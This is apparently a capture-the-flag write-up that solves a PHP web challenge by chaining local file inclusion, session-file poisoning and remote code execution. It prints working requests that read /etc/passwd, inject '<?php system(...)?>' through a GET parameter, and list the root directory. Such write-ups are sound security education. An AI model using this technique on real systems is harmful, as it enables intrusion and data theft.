# Web - ForbiddEn JutSu

## Challenge description:

![image](https://user-images.githubusercontent.com/70543460/209949450-0119cb60-c0d1-4016-8b2a-42d2b3709560.png)

## Quick Navigation:

- **[(1) Understanding the source code](https://github.com/Cyb3rDoctor/YogoshaChristmasChallenge2022/blob/main/ForbiddEnJutSu.md#1-understanding-the-source-code)**
- **[(2) LFI](https://github.com/Cyb3rDoctor/YogoshaChristmasChallenge2022/blob/main/ForbiddEnJutSu.md#2-lfi)**
- **[(3) LFI to RCE](https://github.com/Cyb3rDoctor/YogoshaChristmasChallenge2022/blob/main/ForbiddEnJutSu.md#3-lfi-to-rce)**

## Solution:

### (1) Understanding the source code:

When I open the web application I get the following source code:
![image](https://user-images.githubusercontent.com/70543460/209949580-592a3ee7-08b0-4e8e-9c4d-cc5b4d638ad4.png)

----------

```php
session_start();
```
This creates a new session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.

So, when the ```session_start()``` runs at the first time, PHP generates a unique session id and passes it to the web browser in the form of a cookie named **PHPSESSID**.

And if a session already exists, PHP checks the **PHPSESSID** cookie sent by the browser, the ```session_start()``` function will resume the existing session instead of creating a new one.

----------

```php
highlight_file(__FILE__);
```
This prints out or returns a syntax highlighted version of the code contained in the current file using the colors defined in the built-in syntax highlighter for PHP.

----------

```php
if(isset($_GET["karma"])){
    $_SESSION["boruto"]=$_GET["karma"];
    include($_GET["karma"]);
```
The if statement checks if the **karma** parameter has been provided in the GET request. If the **karma** parameter is present, the if block will be executed.

Inside the if block: The ```$_SESSION["boruto"]``` variable is set to the value of the **karma** parameter.

Noting that ```$_SESSION``` is an associative array containing session variables available to the current script. And when you store the data in a session using the ```$_SESSION``` super-global, it’s eventually stored in a corresponding session file on the server which was created when the session was started.

Finally, ```include($_GET["karma"]);``` causes the PHP interpreter to include and execute the file specified by the **karma** parameter.

----------

### (2) LFI:

After understanding the source code, I tried passing ``/etc/passwd`` to the **karma** parameter, and the content was printed out:

![image](https://user-images.githubusercontent.com/70543460/209953379-8fa8cb4f-854d-488d-bb8e-7c8c61daccbd.png)

And according to the comment in the source code which says:
```php
//Our secret is in the root directory; You can't reveal it without achieving RCE Jutsu ;)
```
I need to achieve RCE because I won't be able to know the name of the secret file which contains the flag which is located in the root ``/`` directory.

----------

### (3) LFI to RCE:

According to the following line of the source code:
```php
$_SESSION["boruto"]=$_GET["karma"];
```
The value of the **karma** parameter is stored in the session file on the server which was created when the session was started.

After searching a little bit, I found that ```/tmp/``` directory is one of the common locations to store session data files in the following format:
 ```/tmp/sess_[PHPSESSID]```

![image](https://user-images.githubusercontent.com/70543460/209961297-61a8d059-977c-4828-afb1-b77aa29e90cf.png)

So, my sessiod data file was: ```/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```
![image](https://user-images.githubusercontent.com/70543460/209962272-0ac2426b-060d-495e-a748-163bffb66182.png)

And to test the following line:
```php
$_SESSION["boruto"]=$_GET["karma"];
```
I passed **anything** as a value to the **karma** parameter:
```
http://44.200.237.73/?karma=anything
```
Then I opened my session data file:
```http://44.200.237.73/?karma=/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```

And found the data that I passed as a value to the **karma** parameter:
![image](https://user-images.githubusercontent.com/70543460/209962814-8d52e296-335b-4534-9a66-0d9534389f73.png)

Accordingly, I passed a php code that executes ```ls -a /``` as a value to the **karma** parameter:

```http://44.200.237.73/?karma=<?php system('ls -a /');?>```

Then I opened my session data file:

```http://44.200.237.73/?karma=/tmp/sess_26ef471f0ed2b7e54244bd9b0e6e1641```

Bingo! I was able to achieve RCE and I got the name of the secret file which is located in the root ```/``` directory:

![image](https://user-images.githubusercontent.com/70543460/209963269-11c5a430-b0a5-4c00-8742-2418debaaea2.png)

Finally, I got that flag:
```http://44.200.237.73/?karma=/seCretJutsuToKillBorUtoKun.txt```

![image](https://user-images.githubusercontent.com/70543460/209963922-1350f38a-ab69-458d-8f1d-8d52d4f933e7.png)

